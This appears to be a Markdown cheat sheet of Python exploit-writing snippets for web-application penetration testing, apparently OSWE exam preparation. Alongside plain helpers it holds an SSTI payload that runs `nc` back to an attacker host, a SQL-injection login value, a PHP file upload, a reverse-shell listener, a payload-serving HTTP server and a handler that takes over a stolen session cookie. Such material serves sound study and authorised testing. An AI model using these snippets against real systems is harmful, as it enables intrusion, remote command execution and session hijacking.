# Python3 Offensive Scripting
Snippets are skeletons: adapt IPs, paths, payloads, and cookies to your target.

## Logging
```python
GREEN = '\033[0;32m'
RED = '\033[0;31m'
GREY = '\033[38;5;244m'
YELLOW = '\033[38;5;226m'
NC = '\033[0m'

class log():
    def _ts():
        return datetime.now().strftime("%H:%M:%S")

    def success(text):
        print(f"[{log._ts()}] [{GREEN}✓{NC}] {GREEN}{text}{NC}")

    def failure(text):
        print(f"[{log._ts()}] [{RED}✘{NC}] {RED}{text}{NC}")
        if args.debug:
            log.debug("Exiting ...")

    def info(text):
        print(f"[{log._ts()}] [{NC}*{NC}] {NC}{text}{NC}")

    def debug(text):
        if args.debug:
            print(f"{GREY}[{log._ts()}] [DEBUG] {GREY}{text}{NC}")
# ...
parser.add_argument('-d', '--debug', action='store_true', default=False, help='Enable debugging output')
# ... 
log.info(f"Target: {target}")
```
## Random Strings
```python
LENGTH = 8 # How many characters do you want?

# Letters only: a-zA-Z
LETTERS = string.ascii_letters
random_letters = ''.join(random.choice(LETTERS) for _ in range(LENGTH))
print("Letters:      ", random_letters)

# Letters + numbers: a-zA-Z0-9
LETTERS_NUM = string.ascii_letters + string.digits
random_alnum = ''.join(random.choice(LETTERS_NUM) for _ in range(LENGTH))
print("Alphanumeric: ", random_alnum)

# Letters + numbers + symbols: a-zA-Z0-9!@#$...
LETTERS_NUM_SYMBOLS = string.ascii_letters + string.digits + string.punctuation
random_full = ''.join(random.choice(LETTERS_NUM_SYMBOLS) for _ in range(LENGTH))
print("Full charset: ", random_full)
```
## Encoding and Decoding
```python
data = "hello world"

# Encode: str -> bytes -> base64 bytes -> str
encoded = base64.b64encode(data.encode('utf-8')).decode('utf-8')
print(encoded)

# Decode: str -> base64 bytes -> bytes -> str
decoded = base64.b64decode(encoded).decode('utf-8')
print(decoded)

# URL-safe base64 (used in JWTs, URLs — replaces +/ with -_)
url_encoded = base64.urlsafe_b64encode(data.encode()).decode()
print(url_encoded)

url_decoded = base64.urlsafe_b64decode(url_encoded).decode()
print(url_decoded)
```
> [!NOTE]
> Use `utf-16` or `utf-16-le` for Windows/Powershell.


## Using `.replace()`
Too many curly braces (`{}`) will make you in trouble sometimes.
```python
ssti_payload = f"{{{{ __import__('os').system('nc {LHOST} {LPORT}') }}}}"
```
Use `replace()` instead,
```python
ssti_payload = "{{ __import__('os').system('nc <LHOST> <LPORT>') }}"\
    .replace("<LHOST>", LHOST)\
    .replace("<LPORT>", LPORT)
```

## Sending Requests
### Session Setup
Some data such as cookies, headers or proxy configuration can be configured permanently with the `update` function.
```python
parser.add_argument("--proxy", help='proxy everything through burp', action='store_true', default=False)
# ...
s = requests.Session()
# Interacting with an unverified HTTPS server (Using verify argument)
s.verify = False
# Disable redirects
s.allow_redirects = False
# Persistent cookies
s.cookies.update({"PHPSESSID": "fakesession"})
# Persistent headers
s.headers.update({"User-Agent": "Mozilla/5.0"})
# Configure proxies with argparse
if args.proxy:
    s.proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
```
### Sending requests
```python
url = "http://localhost/login.php"
data = { 
    "username": "admin'-- -",
    "password": "anything",
}
cookies = {
    "PHPSESSID": "fakesession"
}
# Use "params" to send the data in the query params
r = s.get(url, params={"id": 1, "name": "test"}, cookies=cookies)
# Use "data" to send the data in the body
r = s.post(url, data=data, cookies=cookies, verify=False)
# Use "json" to send the data in the body as a JSON
r = s.post(url, json=data, cookies=cookies, allow_redirects=False)

files = {
    # (FILE_NAME, FILE_CONTENTS, FILE_MIMETYPE)
    "uploaded_file": ("phpinfo.php", b"<?php phpinfo() ?>", "application/x-httpd-php")
}
# Use "files" to send files
r.post(url, files=files)
```
### Using the output
```python
print (f"Method: {r.request.method}")
print (f"Status code: {r.status_code}")
print (f"Response body as text: {r.text}")
print (f"Response output as bytes: {r.content}")
print (f"Response output as JSON (if body is a JSON): {r.json()}")
print (f"Location Header: {r.headers['Location']}")
```
### Parse HTML Responses
```python
r.get(url)
soup = BeautifulSoup(r.text, "html.parser") # You can use other parsers, such us xml.parser

# Helper function to get the hidden values like:
#  <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="70EC80A7" />
def get_value(field_id):
    tag = soup.find("input", {"id": field_id})
    return tag["value"] if tag and tag.has_attr("value") else None

state = {
    "__VIEWSTATE": get_value("__VIEWSTATE"),
    "__VIEWSTATEGENERATOR": get_value("__VIEWSTATEGENERATOR"),
    "__VIEWSTATEENCRYPTED": get_value("__VIEWSTATEENCRYPTED"),
    "__EVENTVALIDATION": get_value("__EVENTVALIDATION"),
    "testing": get_value("testing"),
}
# to add fixed values
state["txtArg"] = "whoami"
```

## Common script arguments
```python
def parse_args():
    global args
    parser = argparse.ArgumentParser(description="OSWE Exploit Skeleton")
    parser.add_argument("-t", "--target",   required=True,  help="Target base URL (e.g. http://192.168.1.10)")
    parser.add_argument("-l", "--lhost",    required=True,  help="Attacker IP for reverse shell")
    parser.add_argument("-p", "--lport",    required=True,  type=int,   help="Attacker port for reverse shell")
    parser.add_argument("-wp", "--wport",    required=False,  default=80, type=int,   help="Attacker port for http server")
    parser.add_argument("--proxy",          action="store_true", default=False,  help="Enable Burp default proxies (8080)")
    parser.add_argument("--no-verify",      action="store_true", default=True,  help="Disable SSL verification")
    parser.add_argument("-d", "--debug",    action="store_true", default=False, help="Debug mode")

    args = parser.parse_args()
    return args
# ...
parse_args()
```

## Reverse shell handler
```python
def start_listener(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind((host, port))
    except Exception as e:
        print(f"[listener] Failed to bind to {host}:{port}\n\t {e}")
        sys.exit(1)
    
    server.listen(1)
    print(f"[listener] Reverse shell listening on {host}:{port}")

    conn, addr = server.accept()
    print(f"[listener] Connection received from {addr[0]}:{addr[1]}")

    _interact(conn)
    conn.close()
    server.close()

def _interact(conn):
    prompt="[shell] > "
    conn.setblocking(True)
    try:
        while True:
            cmd = input(prompt)
            if not cmd.strip():
                continue
            if cmd.strip().lower() in ("exit", "quit"):
                break

            conn.sendall((cmd + "\n").encode())

            # Read the response. We don't know exactly how much is coming,
            # so read once, then drain any additional buffered data.
            conn.settimeout(0.5)
            output = b""
            try:
                while True:
                    chunk = conn.recv(4096)
                    if not chunk:
                        print("[listener] Connection closed by remote host")
                        return
                    output += chunk
            except socket.timeout:
                pass  # no more data waiting right now
            finally:
                conn.settimeout(None)

            print(output.decode(errors="replace"), end="")

    except (KeyboardInterrupt, EOFError):
        print("[listener] Exiting listener")
        sys.exit(1)
# ...
start_listener("0.0.0.0", 4444)
```
### Event Triggers
1. Add `revshell_callback = threading.Event()`
2. Add in the  `_interact()` function `revshell_callback.set()` as the first line to trigger an event when a host is binded
3. I recomend adding a small sleep to catch the event: `time.sleep(2)`
4. Finally, in your logic, wait for the event to trigger `revshell_callback.wait(timeout=10) # Wait 10s`

## HTTP Server
```python
def start_file_server(host, port):
    # Files source code
    php_file = b"<?php echo 'Hello World'; ?>"
    txt_file = b"hello world"

    # List <filename>: (<source_code>, <MIME type>) 
    routes = {
        "/file.php": (php_file, "application/octet-stream"),
        "/login": (txt_file, "application/text"),
    }

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path in routes:
                content, content_type = routes[self.path]
                self.send_response(200)
                self.send_header("Content-Type", content_type)
                self.send_header("Content-Length", str(len(content)))
                self.end_headers()
                self.wfile.write(content)
                print(f"[http server] {self.client_address[0]} requested {self.path} -> {YELLOW}Success!{NC}")
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"404 Not Found")
                print(f"[http server] {self.client_address[0]} requested {self.path} -> {YELLOW}Not Found!{NC}")

        def log_message(self, format, *args):
            # Suppress default noisy logging; we print our own above
            pass

    try:
        server = socketserver.TCPServer((host, port), Handler)
    except Exception as e:
        print(f"[http server] Failed to bind to {host}:{port}\n\t {e}")
        sys.exit(1)

    print(f"[http server] Serving files on {host}:{port}")
    for path in routes:
        print(f"\t    -> {path}")

    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
# ...
start_file_server("0.0.0.0", 80)
```
> [!NOTE]
> Some MIME types:
> - Plain text:	`text/plain`
> - JSON: `application/json`
> - JavaScript: `text/javascript`
> - HTML: `text/html`
> - XML: `application/xml`
> - Binary/octet-stream: `application/octet-stream`

### Event Triggers
1. Add `php_file_callback = threading.Event()`
2. In the `do_Get()` function add `php_file_callback.set()` when the file is downloaded
3. Finally, in your logic, wait for the event to trigger `php_file_callback.wait(timeout=10) # Wait 10s`

### Steal cookies
```python
def doGET(self):
    # ...
    # Load stolen cookie into session 
    _, enc_cookie = self.path.split("/?cookie=", 1)
    plain_cookie = urlsafe_b64decode(enc_cookie).decode()
    session.cookies["PHPSESSID"] = cookies.SimpleCookie(plain_cookie)["PHPSESSID"]
    print("[+] Stolen cookie:", session.cookies["PHPSESSID"])
```

## Other interesting links, blogs and snippets
- <https://0x4rt3mis.github.io/posts/Python-Code-Snippets/>
- <https://notes.awfulsecurity.org/oswe/oswe-code-review-cheat-sheet>
- <https://github.com/rizemon/exploit-writing-for-oswe/tree/main>
- <https://field-manual.brunorochamoura.com/manual/toolkit/snippets/>
- <https://github.com/computer-engineer/WhiteboxPentest/tree/main/Skeleton%20Scripts>